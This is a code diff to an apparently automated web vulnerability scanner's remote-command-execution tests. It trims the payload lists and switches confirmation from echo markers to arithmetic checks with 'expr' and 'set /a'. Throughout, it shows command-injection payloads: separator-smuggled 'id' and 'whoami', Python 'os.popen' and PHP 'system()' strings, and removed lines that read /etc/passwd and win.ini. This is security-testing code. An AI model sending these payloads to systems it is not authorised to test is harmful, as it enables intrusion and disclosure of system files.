@@ -1875,24 +1875,18 @@ _RCE_TIME_PAYLOADS_WINDOWS = [
 _RCE_OUTPUT_PAYLOADS = [
     # Semicolon separator
     ";id",
-    ";cat /etc/passwd",
     ";whoami",
     # Pipe (most common for command chaining)
     "|id",
-    "|cat /etc/passwd",
     "|whoami",
     # Command substitution
     "$(id)",
-    "$(cat /etc/passwd)",
     "$(whoami)",
     # Backtick substitution
     "`id`",
-    "`cat /etc/passwd`",
     # Newline injection
     "%0aid",
-    "%0acat /etc/passwd",
     "\nid",
-    "\ncat /etc/passwd",
     # Ampersand (background)
     "&id",
     "&&id",
@@ -1900,34 +1894,19 @@ _RCE_OUTPUT_PAYLOADS = [
     "||id",
     # URL-encoded separators
     "%7Cid",           # |id
-    "%7Ccat+/etc/passwd",  # |cat /etc/passwd
     "%3Bid",           # ;id
     # Null byte + command
     "%00|id",
     "%00;id",
-    # Direct command replacement (for params like ?cmd=X where X IS the command)
-    "id",
-    "cat /etc/passwd",
-    "whoami",
-    # Python eval/exec injection
-    "__import__('os').popen('id').read()",
-    "__import__('os').popen('cat /etc/passwd').read()",
-    "eval('__import__(\"os\").popen(\"id\").read()')",
-    # PHP code injection
-    "system('id')",
-    "passthru('id')",
-    "exec('id')",
 ]
 
 _RCE_OUTPUT_PAYLOADS_WINDOWS = [
     "|whoami",
     ";whoami",
     "|ipconfig",
-    "|type C:\\Windows\\win.ini",
-    ";type C:\\Windows\\win.ini",
 ]
 
-_RCE_OUTPUT_INDICATORS = re.compile(r"uid=\d|root:|www-data|/bin/bash|/bin/sh", re.I)
+_RCE_OUTPUT_INDICATORS = re.compile(r"uid=\d+\(\w+\)|www-data", re.I)
 _RCE_WINDOWS_INDICATORS = re.compile(
     r"\[extensions\]|\[fonts\]|for 16-bit app support|"
     r"Windows IP Configuration|\\\\Users\\\\|AUTHORITY\\\\",
@@ -2032,29 +2011,38 @@ async def test_rce(
 
                 match = _RCE_OUTPUT_INDICATORS.search(body)
                 if match and not baseline_has_linux:
-                    # Verify this is genuine RCE, not LFI false positive.
-                    # Payloads like ";cat /etc/passwd" can trigger on LFI
-                    # endpoints that interpret the path component as a file
-                    # read. Send a unique echo marker that only RCE can produce.
-                    marker = f"BUGHOUND_RCE_{uuid.uuid4().hex[:8]}"
-                    # Extract the command separator from the triggering payload
+                    # Verify this is genuine RCE, not LFI or reflection FP.
+                    # Problem: "cat /etc/passwd" triggers on LFI endpoints,
+                    # and "echo MARKER" appears on sites that reflect input
+                    # in HTML (form action, links, etc.).
+                    #
+                    # Solution: Use expr math as confirmation — `expr 13371 + 13372`
+                    # outputs "26743" which ONLY appears via command execution,
+                    # never from URL reflection or LFI file reads.
                     sep_match = re.match(r"^(%[0-9a-fA-F]{2}|[;|&\n`]|&&|\|\||%00[;|]|\$\()", payload)
-                    if sep_match:
-                        sep = sep_match.group(0)
-                        # Build confirmation payload: for $() use $(echo marker),
-                        # for backtick use `echo marker`, otherwise sep + echo marker
-                        if sep == "$(":
-                            confirm_payload = f"$(echo {marker})"
-                        elif sep == "`":
-                            confirm_payload = f"`echo {marker}`"
-                        else:
-                            confirm_payload = f"{sep}echo {marker}"
-                        confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
-                        _, confirm_body, _ = await _send(session, confirm_url)
-                        if marker not in confirm_body:
-                            # Marker absent — likely LFI, not RCE; skip
-                            continue
-                    # Confirmed RCE (or no separator extracted — keep original logic)
+                    if not sep_match:
+                        # Can't extract separator — skip (don't confirm without proof)
+                        continue
+                    sep = sep_match.group(0)
+                    math_a, math_b = 13371, 13372
+                    math_result = str(math_a + math_b)  # "26743"
+                    if sep == "$(":
+                        confirm_payload = f"$(expr {math_a} + {math_b})"
+                    elif sep == "`":
+                        confirm_payload = f"`expr {math_a} + {math_b}`"
+                    else:
+                        confirm_payload = f"{sep}expr {math_a} + {math_b}"
+                    confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
+                    _, confirm_body, _ = await _send(session, confirm_url)
+                    if math_result not in confirm_body:
+                        # Math result absent — not RCE (likely LFI or reflection)
+                        continue
+                    # Also verify the math result is NOT just reflected in URL/form
+                    # by checking it appears outside of URL-encoded contexts
+                    confirm_url_str = confirm_url.replace("%2B", "+")
+                    if confirm_body.count(math_result) <= confirm_body.count(confirm_url_str.split("?")[1] if "?" in confirm_url_str else ""):
+                        continue
+                    # Confirmed genuine RCE via math expression
                     start = max(0, match.start() - 50)
                     end = min(len(body), match.end() + 100)
                     evidence_ctx = body[start:end].strip()
@@ -2062,7 +2050,7 @@ async def test_rce(
                         "vulnerable": True,
                         "technique": "output-based",
                         "payload": payload,
-                        "evidence": f"Command output detected (confirmed via unique marker): ...{evidence_ctx}...",
+                        "evidence": f"RCE confirmed (expr {math_a}+{math_b}={math_result} computed): ...{evidence_ctx}...",
                         "os": "linux",
                         "url": test_url,
                     })
@@ -2072,10 +2060,8 @@ async def test_rce(
             # (e.g., ?cmd=id, ?code=eval_expr, ?exec=command)
             _RCE_DIRECT_PAYLOADS = [
                 "id",
-                "cat /etc/passwd",
                 "whoami",
                 "__import__('os').popen('id').read()",
-                "__import__('os').popen('cat /etc/passwd').read()",
                 "system('id')",
             ]
             for payload in _RCE_DIRECT_PAYLOADS:
@@ -2087,11 +2073,12 @@ async def test_rce(
 
                 match = _RCE_OUTPUT_INDICATORS.search(body)
                 if match and not baseline_has_linux:
-                    # Confirm with unique marker
-                    marker = f"BUGHOUND_RCE_{uuid.uuid4().hex[:8]}"
-                    confirm_url = _replace_param(target_url, param, f"echo {marker}")
+                    # Confirm with math expression (not echo — echo gets reflected)
+                    math_a, math_b = 13371, 13372
+                    math_result = str(math_a + math_b)
+                    confirm_url = _replace_param(target_url, param, f"expr {math_a} + {math_b}")
                     _, confirm_body, _ = await _send(session, confirm_url)
-                    if marker in confirm_body:
+                    if math_result in confirm_body:
                         start = max(0, match.start() - 50)
                         end = min(len(body), match.end() + 100)
                         evidence_ctx = body[start:end].strip()
@@ -2099,7 +2086,7 @@ async def test_rce(
                             "vulnerable": True,
                             "technique": "direct-command",
                             "payload": payload,
-                            "evidence": f"Direct command execution (confirmed via unique marker): ...{evidence_ctx}...",
+                            "evidence": f"Direct command (confirmed expr {math_a}+{math_b}={math_result}): ...{evidence_ctx}...",
                             "os": "linux",
                             "url": test_url,
                         })
@@ -2116,24 +2103,20 @@ async def test_rce(
 
                 win_match = _RCE_WINDOWS_INDICATORS.search(body)
                 if win_match and not baseline_has_win:
-                    # Verify genuine RCE — not a false positive from LFI or
-                    # similar file-read vuln that happens to show win.ini content.
-                    marker = f"BUGHOUND_RCE_{uuid.uuid4().hex[:8]}"
+                    # Verify genuine RCE using math: set /a computes arithmetic
+                    # on Windows. Result "26743" only appears via command execution.
                     sep_match = re.match(r"^(%[0-9a-fA-F]{2}|[;|&\n`]|&&|\|\||%00[;|]|\$\()", payload)
-                    if sep_match:
-                        sep = sep_match.group(0)
-                        if sep == "$(":
-                            confirm_payload = f"$(echo {marker})"
-                        elif sep == "`":
-                            confirm_payload = f"`echo {marker}`"
-                        else:
-                            confirm_payload = f"{sep}echo {marker}"
-                        confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
-                        _, confirm_body, _ = await _send(session, confirm_url)
-                        if marker not in confirm_body:
-                            # Marker absent — likely LFI, not RCE; skip
-                            continue
-                    # Confirmed RCE
+                    if not sep_match:
+                        continue  # Can't confirm without separator
+                    sep = sep_match.group(0)
+                    math_a, math_b = 13371, 13372
+                    math_result = str(math_a + math_b)
+                    confirm_payload = f"{sep}set /a {math_a}+{math_b}"
+                    confirm_url = _replace_param(target_url, param, original_value + confirm_payload)
+                    _, confirm_body, _ = await _send(session, confirm_url)
+                    if math_result not in confirm_body:
+                        continue  # Not RCE
+                    # Confirmed RCE via math
                     start = max(0, win_match.start() - 50)
                     end = min(len(body), win_match.end() + 100)
                     evidence_ctx = body[start:end].strip()
@@ -2141,7 +2124,7 @@ async def test_rce(
                         "vulnerable": True,
                         "technique": "output-based",
                         "payload": payload,
-                        "evidence": f"Command output detected (confirmed via unique marker): ...{evidence_ctx}...",
+                        "evidence": f"RCE confirmed (set /a {math_a}+{math_b}={math_result}): ...{evidence_ctx}...",
                         "os": "windows",
                         "url": test_url,
                     })
